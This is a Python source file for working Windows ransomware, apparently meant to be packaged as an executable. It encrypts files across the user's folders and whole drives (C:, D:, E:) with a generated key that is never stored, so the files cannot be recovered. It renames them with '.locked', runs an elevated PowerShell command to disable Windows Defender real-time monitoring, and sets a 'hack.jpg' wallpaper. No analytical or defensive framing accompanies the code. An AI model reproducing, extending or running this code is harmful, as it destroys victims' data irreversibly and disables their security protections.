import os
from cryptography.fernet import Fernet
import ctypes
import sys
def set_wallpaper(file):
    SPI_SETDESKWALLPAPER = 20
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(base_path, file)
    ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        image_path,
        3
    )
def run_ransomware():
    key = Fernet.generate_key()
    cipher = Fernet(key)
    def encrypt_file(filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted = cipher.encrypt(data)
            with open(filepath, 'wb') as f:
                f.write(encrypted)
            os.rename(filepath, filepath + '.locked')
            return True
        except:
            return False
    def encrypt_directory(path):
        encrypted_count = 0
        for root, dirs, files in os.walk(path):
            for file in files:
                filepath = os.path.join(root, file)
                if encrypt_file(filepath):
                    encrypted_count += 1
        return encrypted_count
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "powershell", 
            "-Command Set-MpPreference -DisableRealtimeMonitoring $true", None, 1)
    except:
        pass
    targets = [
        os.path.expanduser('~/Downloads'),
        os.path.expanduser('~/Desktop'),
        'C:\\',
        'D:\\',
        'E:\\',
        os.path.expanduser('~/Documents'),
        os.path.expanduser('~/Pictures'),
        os.path.expanduser('~/Videos'),
        os.path.expanduser('~/Music')
    ]
    total_encrypted = 0
    for target in targets:
        if os.path.exists(target):
            total_encrypted += encrypt_directory(target)
    try:
        set_wallpaper("hack.jpg")
    except:
        pass